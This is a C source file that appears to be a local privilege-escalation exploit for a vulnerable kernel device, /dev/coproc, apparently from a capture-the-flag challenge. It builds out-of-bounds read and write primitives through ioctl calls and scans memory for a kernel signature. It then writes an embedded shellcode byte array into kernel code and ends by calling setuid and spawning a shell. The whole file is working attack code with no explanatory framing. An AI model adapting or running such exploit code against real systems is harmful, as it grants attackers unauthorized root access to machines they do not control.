#include "pwnc.h"
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>

typedef struct {
  u32 width;
  u32 height;
  struct {
    u32 base;
    u32 len;
  } packets;
  u32 input;
  u32 output;
} Config;

typedef struct {
  u32 kind;
  struct {
    u32 x;
    u32 y;
    u32 width;
    u32 height;
  } bounds;
} Packet;

int fd;
Packet *packets;
Packet *input;
char *output;
Config *config;

void oobr(long offset) {
  config->height = 5;
  config->width = 5;
  config->packets.base = (u32)packets;
  config->packets.len = 2;
  config->input = (u32)input;
  config->output = (u32)packets;

  packets[0].kind = 5;
  packets[0].bounds.height = 5;
  packets[0].bounds.width = 5;
  packets[0].bounds.x = 0;
  packets[0].bounds.y = 0;

  packets[1].kind = 5;
  packets[1].bounds.height = 5;
  packets[1].bounds.width = 5;
  packets[1].bounds.x = 0;
  packets[1].bounds.y = 0;

  input[0].kind = 0;
  input[0].bounds.height = 0;
  input[0].bounds.width = 0;
  input[0].bounds.x = 0;
  input[0].bounds.y = 0;

  input[1].kind = 5;
  input[1].bounds.height = 1;
  input[1].bounds.width = 0x1000;
  input[1].bounds.x = offset;
  input[1].bounds.y = 0;

  try(ioctl(fd, 0, config));
}

void oobw(long offset) {
  config->height = 5;
  config->width = 5;
  config->packets.base = (u32)packets;
  config->packets.len = 2;
  config->input = (u32)input;
  config->output = (u32)packets;

  packets[0].kind = 5;
  packets[0].bounds.height = 5;
  packets[0].bounds.width = 5;
  packets[0].bounds.x = 0;
  packets[0].bounds.y = 0;

  packets[1].kind = 5;
  packets[1].bounds.height = 5;
  packets[1].bounds.width = 5;
  packets[1].bounds.x = 0;
  packets[1].bounds.y = 0;

  input[1].kind = 6;
  input[1].bounds.height = 1;
  input[1].bounds.width = 0x100;
  input[1].bounds.x = offset;
  input[1].bounds.y = 0;

  try(ioctl(fd, 0, config));
}

int main() {
  setbuf(stdout, NULL);
  setbuf(stderr, NULL);

  fd = chk(open("/dev/coproc", O_RDWR));
  packets = chk(mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0));
  input = chk(mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                   MAP_ANON | MAP_PRIVATE | MAP_32BIT, -1, 0));
  output = chk(mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0));
  config = chk(mmap(NULL, 0x10000, PROT_READ | PROT_WRITE,
                    MAP_ANONYMOUS | MAP_PRIVATE | MAP_32BIT, -1, 0));

  oobr(0x1000);

  long paddr = config->input & 0x7fffffff;
  printf("input paddr = %p\n", config->input);

  u32 target, offset;

  for (int i = 0x40; i < 256; i++) {
    target = i << 20;
    offset = (target - paddr) / 4;
    printf("target = %p, offset = %p\n", target, offset);

    oobr(offset);
    if (0x4101e9e8ae0f9066 == ((long *)packets)[0]) {
      printf("FOUND!\n");
      break;
    }
  }

  unsigned char shell_bin[] = {0x58, 0x50, 0x48, 0x05, 0x92, 0xbc, 0x91,
                               0x00, 0x65, 0x48, 0x8b, 0x14, 0x25, 0x80,
                               0xc5, 0x02, 0x00, 0x48, 0x89, 0x82, 0x68,
                               0x07, 0x00, 0x00, 0xc3};
  paddr = config->output & 0x7fffffff;
  offset = (target + 0x303d80 - paddr) / 4;

  memcpy(input, shell_bin, 20);
  oobw(offset);

  memcpy(input, shell_bin + 20, 20);
  offset = (target + 0x303d80 + 20 - paddr) / 4;
  oobw(offset);

  syscall(SYS_setuid);

  system("sh");
}